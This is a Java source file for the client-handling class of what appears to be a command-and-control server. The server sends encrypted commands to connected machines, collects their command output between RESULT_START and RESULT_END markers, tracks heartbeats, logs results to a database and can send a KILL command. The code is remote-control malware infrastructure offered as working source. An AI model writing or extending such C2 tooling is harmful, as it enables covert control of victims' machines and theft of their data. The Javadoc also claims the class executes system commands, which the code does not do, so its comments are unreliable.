
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

/**
 * Handles communication with a single connected client.
 *
 * Each ClientHandler runs in its own thread and is responsible for:
 * - Receiving encrypted commands from a client
 * - Decrypting commands using CryptoUtils
 * - Handling special commands: PING (heartbeat), QUIT, RESULT_START/RESULT_END (result blocks)
 * - Executing system commands received from the server
 * - Capturing and returning multi-line command output
 * - Logging all events and results to the database via DatabaseManage
 * - Maintaining a heartbeat timestamp for inactivity detection
 * - Gracefully disconnecting the client when requested or on error
 *
 * This class ensures that client communication is isolated and processed
 * asynchronously, without blocking the main server loop.
 */

public class ClientHandler implements Runnable {

    private final int clientId;
    private final Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    
    private volatile boolean running = true;
    private volatile long lastHeartbeat = System.currentTimeMillis();

    public ClientHandler(int clientId, Socket socket) {
        this.clientId = clientId;
        this.socket = socket;
    }

    @Override
    public void run() {
        try {
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            
            sendMessage("ID " + clientId);
            String inputLine;
            while (running && (inputLine = in.readLine()) != null) {
                String decrypted = CryptoUtils.decrypt(inputLine);
                if (decrypted == null) continue;
                
                if (decrypted.equals("PING")) {
                    lastHeartbeat = System.currentTimeMillis();
                    continue;
                }
                else if (decrypted.equals("QUIT")) {
                    break;
                } 
                else if(decrypted.startsWith("RESULT_START")){
                    StringBuilder fullOutput = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        String decLine = CryptoUtils.decrypt(line);
                        if (decLine == null || decLine.equals("RESULT_END")) break;
                        fullOutput.append(decLine).append("\n");
                    }
                    // handles response from running the client
                    System.out.println("\n[RESULT FROM CLIENT " + clientId + "]:");
                    System.out.println(fullOutput.toString());
                    // logging response in DB
                    DatabaseManage.logEvent("Result from Client " + clientId + ":\n" + fullOutput.toString());
                    System.out.print("C2> "); 
                }
            }
            
        } 
        catch (IOException e) {
            throw new RuntimeException("Failed to close client streams", e);
        } 
        finally {
            cleanup();
        }
    }
    
    public void sendMessage(String msg) {
        if (out != null && running) {
            String encryptedMsg = CryptoUtils.encrypt(msg);
            if (encryptedMsg != null) {
                out.println(encryptedMsg);
            }
        }
    }
    
    public void disconnect() {
        sendMessage("KILL");
        running = false;
        cleanup();
    }

    private synchronized void cleanup() {
        DatabaseManage.logEvent("Client " + clientId + " disconnected.");
        Server.removeClient(clientId);
        try {
            if (out != null) out.close();
            if (in != null) in.close();
            if (socket != null && !socket.isClosed()) socket.close();
        } 
        catch (IOException e) {
            throw new RuntimeException("Failed to close client streams", e);
        }
    }

    public int getClientId() {
        return this.clientId;
    }

    public long getLastHeartbeat() {
        return this.lastHeartbeat;
    }
}
